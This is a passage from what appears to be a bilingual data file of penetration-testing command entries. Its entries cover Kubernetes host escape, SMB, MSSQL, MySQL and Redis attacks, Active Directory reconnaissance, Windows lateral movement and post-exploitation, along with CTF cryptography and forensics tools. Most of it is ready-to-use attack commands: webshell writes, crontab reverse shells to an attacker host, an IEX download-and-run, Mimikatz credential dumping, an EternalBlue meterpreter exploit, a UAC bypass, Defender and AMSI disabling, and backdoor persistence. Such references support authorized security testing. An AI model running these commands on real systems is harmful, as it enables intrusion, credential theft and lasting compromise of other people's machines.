      { name: { zh: '特权 Pod 创建', en: 'Create privileged pod' }, command: "kubectl run pwn --image=alpine --restart=Never --overrides='{\"spec\":{\"hostPID\":true,\"hostNetwork\":true,\"containers\":[{\"name\":\"pwn\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}' -- sleep 3600", description: { zh: '创建特权 Pod 以逃逸到主机', en: 'Create privileged pod to escape to host' }, platform: 'all' },
      { name: { zh: 'kubeletctl', en: 'kubeletctl attacks' }, command: 'kubeletctl -s target_ip pods\nkubeletctl -s target_ip exec -n kube-system -p pod_name -c container -- id', description: { zh: '通过 kubelet API 攻击节点', en: 'Attack node via kubelet API' }, platform: 'linux' },
      { name: { zh: 'etcd 读取', en: 'Read etcd' }, command: 'ETCDCTL_API=3 etcdctl get / --prefix --keys-only\nETCDCTL_API=3 etcdctl get /registry/secrets/default/mysecret', description: { zh: '直接读取 etcd 中的 secrets', en: 'Directly read secrets from etcd' }, platform: 'linux' }
    ],
    references: ['https://github.com/BishopFox/badPods', 'https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes']
  },
  {
    id: 'ctf-crypto-tools',
    name: { zh: 'CTF 密码学工具', en: 'CTF Crypto Tools' },
    description: { zh: 'CTF 密码学挑战常用工具和 Python 命令', en: 'Common tools and Python commands for CTF cryptography challenges' },
    category: { zh: 'CTF/密码学', en: 'CTF / Cryptography' },
    installation: 'pip install pycryptodome gmpy2 factordb-pycli z3-solver',
    commands: [
      { name: { zh: 'RSA 小指数攻击', en: 'RSA small exponent attack' }, command: "from Crypto.Util.number import long_to_bytes\nimport gmpy2\n# e=3 小指数: m = iroot(c, 3)\nm, ok = gmpy2.iroot(c, e)\nif ok: print(long_to_bytes(m))", description: { zh: 'RSA e=3 立方根攻击', en: 'RSA e=3 cube root attack' }, platform: 'all' },
      { name: { zh: 'RSA 公因数分解', en: 'RSA common factor attack' }, command: "import math\nfrom Crypto.Util.number import *\np = math.gcd(n1, n2)\nq = n1 // p\nd = inverse(e, (p-1)*(q-1))\nprint(long_to_bytes(pow(c, d, n1)))", description: { zh: '两个共享质因数的 RSA 公钥分解', en: 'Factor RSA keys that share a prime factor' }, platform: 'all' },
      { name: { zh: 'factordb 查询', en: 'factordb lookup' }, command: "from factordb.factordb import FactorDB\nf = FactorDB(n)\nf.connect()\nprint(f.get_factor_list())", description: { zh: '在线查询大数因式分解', en: 'Online lookup for large number factorization' }, platform: 'all' },
      { name: { zh: 'z3 约束求解', en: 'z3 constraint solving' }, command: "from z3 import *\nx = BitVec('x', 32)\ns = Solver()\ns.add(x * 0x1234 + 0x5678 == 0xdeadbeef)\nif s.check() == sat: print(s.model())", description: { zh: '使用 z3 求解 CTF 逆向约束', en: 'Solve CTF reverse engineering constraints with z3' }, platform: 'all' },
      { name: { zh: 'XOR 暴力破解', en: 'XOR brute force' }, command: "cipher = bytes.fromhex('aabbccdd...')\nfor key in range(256):\n    plain = bytes([b ^ key for b in cipher])\n    if b'flag' in plain.lower(): print(key, plain)", description: { zh: '单字节 XOR 暴力破解', en: 'Single-byte XOR brute force' }, platform: 'all' },
      { name: { zh: 'AES ECB 解密', en: 'AES ECB decrypt' }, command: "from Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_ECB)\nplain = cipher.decrypt(ciphertext)\nprint(plain)", description: { zh: 'AES ECB 模式解密', en: 'AES ECB mode decryption' }, platform: 'all' },
      { name: { zh: 'Base 变体解码', en: 'Base variant decoding' }, command: "import base64\n# base32\nbase64.b32decode(s)\n# base58\nimport base58; base58.b58decode(s)\n# base85\nbase64.b85decode(s)", description: { zh: '常见 Base 变体编码解码', en: 'Common Base encoding variant decoding' }, platform: 'all' },
      { name: { zh: 'openssl RSA 操作', en: 'OpenSSL RSA operations' }, command: 'openssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem\nopenssl rsautl -decrypt -inkey private.pem -in cipher.bin', description: { zh: 'OpenSSL RSA 生成和操作', en: 'OpenSSL RSA generation and operations' }, platform: 'all' }
    ],
    references: ['https://github.com/Ganapati/RsaCtfTool', 'https://cryptohack.org/']
  },
  {
    id: 'rsactftool',
    name: 'RsaCtfTool',
    description: { zh: 'RSA CTF 自动化攻击工具，支持多种 RSA 弱密钥攻击', en: 'Automated RSA CTF attack tool supporting multiple weak key attacks' },
    category: { zh: 'CTF/密码学', en: 'CTF / Cryptography' },
    installation: 'git clone https://github.com/RsaCtfTool/RsaCtfTool && pip install -r requirements.txt',
    commands: [
      { name: { zh: '自动攻击', en: 'Auto attack' }, command: 'python3 RsaCtfTool.py --publickey public.pem --uncipherfile cipher.txt', description: { zh: '自动尝试所有已知 RSA 攻击', en: 'Auto-try all known RSA attacks' }, platform: 'all' },
      { name: { zh: '指定 n,e,c', en: 'Specify n, e, c' }, command: 'python3 RsaCtfTool.py -n 0xabc... -e 65537 -c 0xdef...', description: { zh: '手动指定 RSA 参数攻击', en: 'Manually specify RSA parameters for attack' }, platform: 'all' },
      { name: { zh: '多公钥攻击', en: 'Multiple public keys' }, command: 'python3 RsaCtfTool.py --publickey "*.pem" --private', description: { zh: '批量攻击多个公钥', en: 'Attack multiple public keys in batch' }, platform: 'all' },
      { name: { zh: '列出攻击方法', en: 'List attacks' }, command: 'python3 RsaCtfTool.py --listattacks', description: { zh: '列出所有支持的攻击方式', en: 'List all supported attack methods' }, platform: 'all' }
    ],
    references: ['https://github.com/RsaCtfTool/RsaCtfTool']
  },


  {
    id: 'wireshark-tshark',
    name: 'Wireshark / tshark',
    description: { zh: '网络流量分析工具，CTF 流量分析和内网抓包必备', en: 'Network traffic analysis tool, essential for CTF traffic analysis and intranet packet capture' },
    category: { zh: 'CTF/流量分析', en: 'CTF / Traffic Analysis' },
    installation: 'apt install wireshark tshark',
    commands: [
      { name: { zh: '实时抓包', en: 'Live capture' }, command: 'tshark -i eth0 -w capture.pcap\nsudo tcpdump -i any -w capture.pcap', description: { zh: '抓取网络流量到文件', en: 'Capture network traffic to file' }, platform: 'linux' },
      { name: { zh: '过滤协议', en: 'Filter by protocol' }, command: "tshark -r capture.pcap -Y 'http'\ntshark -r capture.pcap -Y 'dns'\ntshark -r capture.pcap -Y 'ftp or ssh'", description: { zh: '按协议过滤数据包', en: 'Filter packets by protocol' }, platform: 'all' },
      { name: { zh: '提取 HTTP 内容', en: 'Extract HTTP content' }, command: "tshark -r capture.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri\n# 导出 HTTP 对象\ntshark -r capture.pcap --export-objects http,./exported/", description: { zh: '提取 HTTP 请求和响应内容', en: 'Extract HTTP requests and response content' }, platform: 'all' },
      { name: { zh: '搜索字符串', en: 'Search for strings' }, command: "tshark -r capture.pcap -Y 'frame contains \"flag\"' -T fields -e frame.number -e data.text\nstrings capture.pcap | grep -i flag", description: { zh: '在数据包中搜索关键字符串', en: 'Search packets for keyword strings' }, platform: 'all' },
      { name: { zh: '提取 TCP 流', en: 'Extract TCP stream' }, command: "tshark -r capture.pcap -q -z follow,tcp,ascii,0\n# Wireshark: 右键 -> Follow -> TCP Stream", description: { zh: '重建 TCP 会话内容', en: 'Reconstruct TCP session content' }, platform: 'all' },
      { name: { zh: '统计信息', en: 'Statistics' }, command: 'tshark -r capture.pcap -q -z conv,tcp\ntshark -r capture.pcap -q -z io,phs', description: { zh: '显示连接统计和协议层次', en: 'Show connection stats and protocol hierarchy' }, platform: 'all' }
    ],
    references: ['https://www.wireshark.org/docs/man-pages/tshark.html']
  },
  {
    id: 'john-enhanced',
    name: { zh: 'John the Ripper 进阶用法', en: 'John the Ripper Advanced Usage' },
    description: { zh: 'John the Ripper 高级用法，包含格式转换和规则配置', en: 'Advanced John the Ripper usage including format conversion and rule configuration' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install john / snap install john-the-ripper',
    commands: [
      { name: { zh: '列出支持的格式', en: 'List supported formats' }, command: 'john --list=formats\njohn --list=formats | grep -i md5', description: { zh: '查看所有支持的哈希格式', en: 'View all supported hash formats' }, platform: 'linux' },
      { name: { zh: 'SSH 私钥破解', en: 'Crack SSH private key' }, command: 'ssh2john id_rsa > ssh.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash\njohn --show ssh.hash', description: { zh: '破解加密的 SSH 私钥', en: 'Crack encrypted SSH private key passphrase' }, platform: 'linux' },
      { name: { zh: 'ZIP 文件破解', en: 'Crack ZIP password' }, command: 'zip2john protected.zip > zip.hash\njohn --wordlist=rockyou.txt zip.hash', description: { zh: '破解加密的 ZIP 文件', en: 'Crack encrypted ZIP file password' }, platform: 'linux' },
      { name: { zh: 'KeePass 破解', en: 'Crack KeePass' }, command: 'keepass2john database.kdbx > kdbx.hash\njohn --wordlist=rockyou.txt kdbx.hash', description: { zh: '破解 KeePass 数据库密码', en: 'Crack KeePass database password' }, platform: 'linux' },
      { name: { zh: '规则变换', en: 'Rule-based cracking' }, command: 'john --wordlist=wordlist.txt --rules=best64 hash.txt\njohn --wordlist=wordlist.txt --rules=KoreLogic hash.txt', description: { zh: '使用规则对字典词汇进行变换', en: 'Apply rules to transform dictionary words' }, platform: 'linux' },
      { name: { zh: '掩码攻击', en: 'Mask attack' }, command: 'john --mask=?d?d?d?d?d?d hash.txt\n# ?d=数字 ?l=小写 ?u=大写 ?s=符号 ?a=所有', description: { zh: '使用掩码模式暴力破解', en: 'Brute force using a mask pattern' }, platform: 'linux' }
    ],
    references: ['https://www.openwall.com/john/doc/']
  },
  {
    id: 'ssh-pentest',
    name: { zh: 'SSH 渗透测试命令', en: 'SSH Penetration Testing Commands' },
    description: { zh: 'SSH 服务侦察、枚举、利用和隧道命令集合', en: 'SSH service reconnaissance, enumeration, exploitation, and tunneling commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install openssh-client',
    commands: [
      { name: { zh: '版本探测', en: 'Version detection' }, command: 'ssh -vvv user@target 2>&1 | grep "SSH"\nnmap -sV -p 22 target\nnc target 22', description: { zh: '探测 SSH 服务版本', en: 'Detect SSH service version' }, platform: 'all' },
      { name: { zh: '用户名枚举', en: 'Username enumeration' }, command: 'msf: use auxiliary/scanner/ssh/ssh_enumusers\npython3 ssh_user_enum.py -U users.txt -t target', description: { zh: 'SSH 用户名枚举', en: 'Enumerate valid SSH usernames' }, platform: 'linux' },
      { name: { zh: '本地端口转发', en: 'Local port forwarding' }, command: 'ssh -L 8080:internal_host:80 user@jump_host\n# 访问: curl http://localhost:8080', description: { zh: '将远程端口转发到本地', en: 'Forward remote port to local machine' }, platform: 'all' },
      { name: { zh: '远程端口转发', en: 'Remote port forwarding' }, command: 'ssh -R 4444:localhost:4444 user@attacker\n# 在攻击者机器上接受反弹 shell', description: { zh: '将本地端口转发到远程', en: 'Forward local port to remote machine' }, platform: 'all' },
      { name: { zh: '动态 SOCKS 代理', en: 'Dynamic SOCKS proxy' }, command: 'ssh -D 1080 user@jump_host\n# proxychains4 nmap -sT 10.10.10.0/24', description: { zh: '通过 SSH 建立动态 SOCKS5 代理', en: 'Establish dynamic SOCKS5 proxy through SSH' }, platform: 'all' },
      { name: { zh: '多跳隧道', en: 'Multi-hop tunnel' }, command: 'ssh -J jump1,jump2 user@final_target\n# 或 ProxyJump 配置', description: { zh: '通过多个跳板机连接目标', en: 'Connect to target through multiple jump hosts' }, platform: 'all' },
      { name: { zh: '私钥利用', en: 'Private key exploitation' }, command: 'chmod 600 id_rsa\nssh -i id_rsa user@target\n# 批量尝试私钥\nfor key in *.pem; do ssh -i $key -o BatchMode=yes user@target 2>&1; done', description: { zh: '使用私钥认证登录', en: 'Authenticate using private key' }, platform: 'linux' }
    ],
    references: ['https://man.openbsd.org/ssh']
  },
  {
    id: 'smb-pentest',
    name: { zh: 'SMB 渗透测试命令', en: 'SMB Penetration Testing Commands' },
    description: { zh: 'SMB 协议枚举、攻击和横向移动命令', en: 'SMB protocol enumeration, exploitation, and lateral movement commands' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'apt install smbclient samba-common',
    commands: [
      { name: { zh: 'SMB 版本探测', en: 'SMB version detection' }, command: 'nmap -sV -p 445 --script smb-security-mode target\nnmap -p 445 --script smb-vuln-ms17-010 target', description: { zh: '探测 SMB 版本和漏洞', en: 'Detect SMB version and vulnerabilities' }, platform: 'linux' },
      { name: { zh: '匿名枚举', en: 'Anonymous enumeration' }, command: 'smbclient -L //target -N\nsmbmap -H target\nenum4linux -a target', description: { zh: '匿名枚举 SMB 共享和用户', en: 'Anonymously enumerate SMB shares and users' }, platform: 'linux' },
      { name: { zh: '访问共享', en: 'Access share' }, command: 'smbclient //target/share -U user%password\n# 交互命令: ls, get, put, cd\nsmbget -R smb://target/share/', description: { zh: '连接并访问 SMB 共享', en: 'Connect and access SMB share' }, platform: 'linux' },
      { name: { zh: 'EternalBlue (MS17-010)', en: 'EternalBlue exploit' }, command: 'msf: use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run', description: { zh: 'MS17-010 EternalBlue 漏洞利用', en: 'MS17-010 EternalBlue exploit' }, platform: 'linux' },
      { name: { zh: 'PsExec 横向移动', en: 'PsExec lateral movement' }, command: 'psexec.py domain/user:password@target\nimpacket-psexec user:pass@target cmd.exe', description: { zh: '通过 PsExec 横向移动', en: 'Lateral movement via PsExec' }, platform: 'linux' },
      { name: { zh: 'Responder 捕获', en: 'Responder capture' }, command: 'sudo responder -I eth0 -rdw\n# 捕获到的 NTLMv2 哈希保存在 /usr/share/responder/logs/\nhascat -m 5600 hash.txt rockyou.txt', description: { zh: '使用 Responder 捕获 NTLM 哈希', en: 'Capture NTLM hashes using Responder' }, platform: 'linux' }
    ],
    references: ['https://github.com/fortra/impacket']
  },
  {
    id: 'mssql-pentest',
    name: { zh: 'MSSQL 渗透测试', en: 'MSSQL Penetration Testing' },
    description: { zh: 'Microsoft SQL Server 渗透测试命令', en: 'Microsoft SQL Server penetration testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install impacket / apt install sqsh',
    commands: [
      { name: { zh: '连接 MSSQL', en: 'Connect to MSSQL' }, command: 'impacket-mssqlclient domain/user:password@target\n# 或\nsqsh -S target -U sa -P password', description: { zh: '连接到 MSSQL 服务器', en: 'Connect to MSSQL server' }, platform: 'linux' },
      { name: { zh: 'xp_cmdshell 执行命令', en: 'Execute via xp_cmdshell' }, command: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';", description: { zh: '启用并执行 xp_cmdshell', en: 'Enable and execute xp_cmdshell' }, platform: 'all' },
      { name: { zh: '读取文件', en: 'Read files' }, command: "BULK INSERT temp FROM 'C:\\Windows\\win.ini' WITH (FIELDTERMINATOR = '\\n');\nSELECT * FROM OPENROWSET(BULK 'C:\\secret.txt', SINGLE_CLOB) AS t;", description: { zh: '通过 MSSQL 读取服务器文件', en: 'Read server files via MSSQL' }, platform: 'all' },
      { name: { zh: '链接服务器攻击', en: 'Linked server attack' }, command: "SELECT * FROM sys.servers;\nEXEC ('xp_cmdshell ''whoami''') AT [linked_server];", description: { zh: '通过链接服务器横向移动', en: 'Lateral movement via linked servers' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server']
  },


  {
    id: 'mysql-pentest',
    name: { zh: 'MySQL 渗透测试', en: 'MySQL Penetration Testing' },
    description: { zh: 'MySQL 数据库渗透测试命令', en: 'MySQL database penetration testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install mysql-client',
    commands: [
      { name: { zh: '连接数据库', en: 'Connect to database' }, command: 'mysql -h target -u root -p\nmysql -h target -u root -p --ssl=0', description: { zh: '连接到 MySQL 服务器', en: 'Connect to MySQL server' }, platform: 'all' },
      { name: { zh: '基础信息收集', en: 'Basic enumeration' }, command: "SELECT version();\nSELECT user();\nSELECT @@datadir;\nSHOW databases;\nSHOW grants;", description: { zh: '收集 MySQL 版本和权限信息', en: 'Gather MySQL version and privilege info' }, platform: 'all' },
      { name: { zh: '读取文件', en: 'Read files' }, command: "SELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/var/www/html/config.php');", description: { zh: '使用 LOAD_FILE 读取服务器文件', en: 'Read server files using LOAD_FILE' }, platform: 'all' },
      { name: { zh: '写文件 WebShell', en: 'Write WebShell' }, command: "SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/shell.php';\n-- 需要 FILE 权限和 secure_file_priv=''\nSHOW VARIABLES LIKE 'secure_file_priv';", description: { zh: '写入 WebShell 文件', en: 'Write a WebShell file to disk' }, platform: 'all' },
      { name: { zh: 'UDF 提权', en: 'UDF privilege escalation' }, command: '-- 上传 UDF so 文件到插件目录\nSELECT @@plugin_dir;\n-- 创建 UDF 函数\nCREATE FUNCTION sys_exec RETURNS INTEGER SONAME "udf.so";\nSELECT sys_exec("id > /tmp/out.txt");', description: { zh: '通过 UDF 执行系统命令', en: 'Execute system commands via UDF' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql']
  },
  {
    id: 'redis-pentest',
    name: { zh: 'Redis 渗透测试', en: 'Redis Penetration Testing' },
    description: { zh: 'Redis 未授权访问和 RCE 利用命令', en: 'Redis unauthorized access and RCE exploitation commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install redis-tools',
    commands: [
      { name: { zh: '未授权连接', en: 'Unauthorized connection' }, command: 'redis-cli -h target\nredis-cli -h target ping\nredis-cli -h target info', description: { zh: '测试 Redis 未授权访问', en: 'Test Redis unauthorized access' }, platform: 'all' },
      { name: { zh: '写 SSH 公钥', en: 'Write SSH authorized key' }, command: '(echo -e "\\n\\n"; cat ~/.ssh/id_rsa.pub; echo -e "\\n\\n") > /tmp/key.txt\nredis-cli -h target flushall\ncat /tmp/key.txt | redis-cli -h target -x set sshkey\nredis-cli -h target config set dir /root/.ssh/\nredis-cli -h target config set dbfilename authorized_keys\nredis-cli -h target save', description: { zh: '通过 Redis 写入 SSH 公钥', en: 'Write SSH public key via Redis' }, platform: 'linux' },
      { name: { zh: '写 Crontab', en: 'Write crontab' }, command: 'redis-cli -h target config set dir /var/spool/cron/\nredis-cli -h target config set dbfilename root\nredis-cli -h target set cron "\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n"\nredis-cli -h target save', description: { zh: '通过 Redis 写入 Crontab 反弹 Shell', en: 'Write crontab via Redis for reverse shell' }, platform: 'linux' },
      { name: { zh: 'WebShell 写入', en: 'Write WebShell' }, command: 'redis-cli -h target config set dir /var/www/html/\nredis-cli -h target config set dbfilename shell.php\nredis-cli -h target set shell "<?php system($_GET[\'cmd\']); ?>"\nredis-cli -h target save', description: { zh: '通过 Redis 写入 WebShell', en: 'Write WebShell via Redis' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis']
  },
  {
    id: 'powerview-adrecon',
    name: { zh: 'PowerView AD 信息收集', en: 'PowerView AD Reconnaissance' },
    description: { zh: 'PowerView Active Directory 域内信息收集命令速查', en: 'PowerView Active Directory reconnaissance command reference' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    installation: { zh: '下载 PowerSploit: https://github.com/PowerShellMafia/PowerSploit', en: 'Download PowerSploit: https://github.com/PowerShellMafia/PowerSploit' },
    commands: [
      { name: { zh: '加载 PowerView', en: 'Load PowerView' }, command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")\n# 或本地加载\n. .\\PowerView.ps1', description: { zh: '加载 PowerView 模块', en: 'Load the PowerView module' }, platform: 'windows' },
      { name: { zh: '域基础信息', en: 'Domain basic info' }, command: 'Get-Domain\nGet-DomainController\nGet-DomainPolicy\n(Get-DomainPolicy).SystemAccess', description: { zh: '收集域基础信息', en: 'Gather basic domain information' }, platform: 'windows' },
      { name: { zh: '用户枚举', en: 'User enumeration' }, command: 'Get-DomainUser | select samaccountname,description\nGet-DomainUser -SPN  # Kerberoastable 用户\nGet-DomainUser -PreauthNotRequired  # AS-REP Roasting 用户\nFind-LocalAdminAccess  # 当前用户有本地管理权限的机器', description: { zh: '枚举域用户和特殊账户', en: 'Enumerate domain users and special accounts' }, platform: 'windows' },
      { name: { zh: '计算机枚举', en: 'Computer enumeration' }, command: 'Get-DomainComputer | select name,operatingsystem\nGet-DomainComputer -Unconstrained  # 无约束委派机器\nGet-DomainComputer -TrustedToAuth  # 约束委派机器', description: { zh: '枚举域内计算机', en: 'Enumerate domain computers' }, platform: 'windows' },
      { name: { zh: '查找攻击路径', en: 'Find attack paths' }, command: 'Find-DomainUserLocation  # 域管在哪台机器登录\nInvoke-ShareFinder  # 查找可访问的共享\nFind-InterestingDomainAcl  # 查找可利用的 ACL', description: { zh: '查找域内攻击路径', en: 'Find attack paths in the domain' }, platform: 'windows' },
      { name: { zh: 'ACL 操作', en: 'ACL operations' }, command: 'Get-ObjectAcl -SamAccountName user -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}\nAdd-DomainObjectAcl -TargetIdentity target_user -Rights DCSync', description: { zh: '查询和修改 ACL 权限', en: 'Query and modify ACL permissions' }, platform: 'windows' }
    ],
    references: ['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon']
  },
  {
    id: 'windows-lateral-commands',
    name: { zh: 'Windows 横向移动命令', en: 'Windows Lateral Movement Commands' },
    description: { zh: 'Windows 内网横向移动核心命令集合', en: 'Core Windows lateral movement commands for internal network attacks' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    commands: [
      { name: { zh: 'Pass-the-Hash', en: 'Pass-the-Hash' }, command: '# Mimikatz\nsekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe\n# impacket\npsexec.py -hashes :NTLM_HASH domain/user@target', description: { zh: 'NTLM 哈希传递攻击', en: 'NTLM hash pass-the-hash attack' }, platform: 'all' },
      { name: { zh: 'Over-Pass-the-Hash', en: 'Over-Pass-the-Hash (Pass-the-Key)' }, command: '# Mimikatz: 用 NTLM 哈希申请 Kerberos TGT\nsekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:powershell.exe\nRubeus.exe asktgt /user:admin /rc4:HASH /ptt', description: { zh: '用哈希申请 Kerberos 票据', en: 'Request Kerberos ticket using NTLM hash' }, platform: 'windows' },
      { name: { zh: 'Token 窃取', en: 'Token impersonation' }, command: '# Incognito / Meterpreter\nmeterpreter> load incognito\nmeterpreter> list_tokens -u\nmeterpreter> impersonate_token "DOMAIN\\\\Admin"', description: { zh: '窃取高权限 Token 进行模拟', en: 'Steal high-privilege token for impersonation' }, platform: 'windows' },
      { name: { zh: 'WMI 横向移动', en: 'WMI lateral movement' }, command: 'wmic /node:target /user:domain\\admin /password:pass process call create "cmd.exe /c whoami > C:\\out.txt"\n# impacket\nwmiexec.py domain/user:pass@target', description: { zh: '通过 WMI 在远程执行命令', en: 'Execute commands remotely via WMI' }, platform: 'all' },
      { name: { zh: '计划任务横向', en: 'Scheduled task lateral movement' }, command: 'schtasks /create /s target /u domain\\admin /p pass /tn "Update" /tr "cmd.exe /c whoami > C:\\out.txt" /sc once /st 00:00\natexec.py domain/user:pass@target "whoami"', description: { zh: '通过计划任务执行命令', en: 'Execute commands via scheduled tasks' }, platform: 'all' },
      { name: { zh: 'DCOM 横向', en: 'DCOM lateral movement' }, command: '$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))\n$com.Document.ActiveView.ExecuteShellCommand("cmd.exe","","/c whoami > C:\\out.txt","7")', description: { zh: '通过 DCOM 横向移动', en: 'Lateral movement via DCOM' }, platform: 'windows' }
    ],
    references: ['https://attack.mitre.org/tactics/TA0008/']
  },


  {
    id: 'post-exploitation-linux',
    name: { zh: 'Linux 后渗透命令', en: 'Linux Post-Exploitation Commands' },
    description: { zh: 'Linux 系统拿下后的信息收集、提权和持久化命令', en: 'Linux post-exploitation commands for enumeration, privilege escalation, and persistence' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: '快速信息收集', en: 'Quick enumeration' }, command: 'id; whoami; hostname; uname -a\ncat /etc/passwd | cut -d: -f1\ncat /etc/shadow 2>/dev/null\nss -tlnp; netstat -tlnp 2>/dev/null', description: { zh: '快速收集系统基本信息', en: 'Quickly gather basic system information' }, platform: 'linux' },
      { name: { zh: 'SUID 提权', en: 'SUID escalation' }, command: 'find / -perm -4000 -type f 2>/dev/null\n# 查阅 https://gtfobins.github.io/\n# 示例: find 的 SUID\nfind . -exec /bin/sh -p \\;', description: { zh: '查找并利用 SUID 二进制文件', en: 'Find and exploit SUID binaries' }, platform: 'linux' },
      { name: { zh: 'Sudo 提权', en: 'Sudo escalation' }, command: 'sudo -l\n# 查阅 GTFOBins 找对应 sudo 提权\n# 示例: sudo vim\nsudo vim -c "!bash"', description: { zh: '检查并利用 sudo 权限', en: 'Check and exploit sudo permissions' }, platform: 'linux' },
      { name: { zh: 'Capabilities 提权', en: 'Capabilities escalation' }, command: 'getcap -r / 2>/dev/null\n# 示例: python3 有 cap_setuid\npython3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', description: { zh: '查找并利用 Linux capabilities', en: 'Find and exploit Linux capabilities' }, platform: 'linux' },
      { name: { zh: '路径劫持', en: 'PATH hijacking' }, command: 'echo $PATH\nstrings /usr/local/bin/vulnerable_suid | grep -i "ls\\|cat\\|id"\nmkdir /tmp/evil && echo "#!/bin/bash\\nbash -p" > /tmp/evil/id\nchmod +x /tmp/evil/id\nexport PATH=/tmp/evil:$PATH\n./vulnerable_suid', description: { zh: '劫持 SUID 程序的 PATH 变量', en: 'Hijack PATH in SUID program' }, platform: 'linux' },
      { name: { zh: '持久化后门', en: 'Persistence backdoor' }, command: '# SSH 公钥写入\necho "ssh-rsa AAAAB3... attacker" >> ~/.ssh/authorized_keys\n# Crontab 反弹 Shell\n(crontab -l; echo "*/5 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1") | crontab -', description: { zh: '建立 Linux 持久化后门', en: 'Establish Linux persistence backdoor' }, platform: 'linux' },
      { name: { zh: 'TTY 升级', en: 'TTY upgrade' }, command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# 后台 + stty\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm", description: { zh: '将基础 shell 升级为完整 TTY', en: 'Upgrade basic shell to full TTY' }, platform: 'linux' }
    ],
    references: ['https://gtfobins.github.io/', 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation']
  },
  {
    id: 'post-exploitation-windows',
    name: { zh: 'Windows 后渗透命令', en: 'Windows Post-Exploitation Commands' },
    description: { zh: 'Windows 系统拿下后的信息收集、提权和持久化命令', en: 'Windows post-exploitation commands for enumeration, privilege escalation, and persistence' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: '快速信息收集', en: 'Quick enumeration' }, command: 'whoami /all\nsysteminfo\nnet user; net localgroup administrators\nipconfig /all; netstat -ano\nwmic product get name,version', description: { zh: '快速收集 Windows 系统信息', en: 'Quickly gather Windows system information' }, platform: 'windows' },
      { name: { zh: '凭证收集', en: 'Credential harvesting' }, command: '# Mimikatz\nprivilege::debug\nsekurlsa::logonpasswords\n# 注册表凭证\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n# WiFi 密码\nnetsh wlan show profile; netsh wlan show profile name="WiFi" key=clear', description: { zh: '从 Windows 系统收集凭证', en: 'Harvest credentials from Windows system' }, platform: 'windows' },
      { name: { zh: 'UAC 绕过', en: 'UAC bypass' }, command: '# Fodhelper bypass\nNew-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Value "cmd.exe" -Force\nNew-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force\nStart-Process "C:\\Windows\\System32\\fodhelper.exe"', description: { zh: '使用 Fodhelper 绕过 UAC', en: 'Bypass UAC using Fodhelper' }, platform: 'windows' },
      { name: { zh: '持久化', en: 'Persistence' }, command: '# 注册表启动项\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "C:\\backdoor.exe" /f\n# 计划任务\nschtasks /create /tn "Update" /tr "C:\\backdoor.exe" /sc onlogon /ru System', description: { zh: 'Windows 持久化方式', en: 'Windows persistence methods' }, platform: 'windows' },
      { name: { zh: '防御绕过', en: 'Defense bypass' }, command: '# 关闭 Defender 实时保护\nSet-MpPreference -DisableRealtimeMonitoring $true\n# 排除目录\nAdd-MpPreference -ExclusionPath "C:\\Temp"\n# AMSI 绕过\n[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)', description: { zh: '绕过 Windows Defender 和 AMSI', en: 'Bypass Windows Defender and AMSI' }, platform: 'windows' }
    ],
    references: ['https://lolbas-project.github.io/', 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation']
  },
  {
    id: 'ctf-forensics-tools',
    name: { zh: 'CTF 取证工具集', en: 'CTF Forensics Toolkit' },
    description: { zh: 'CTF 数字取证常用工具命令速查', en: 'Quick reference for common CTF digital forensics tool commands' },
    category: { zh: 'CTF/取证', en: 'CTF / Forensics' },
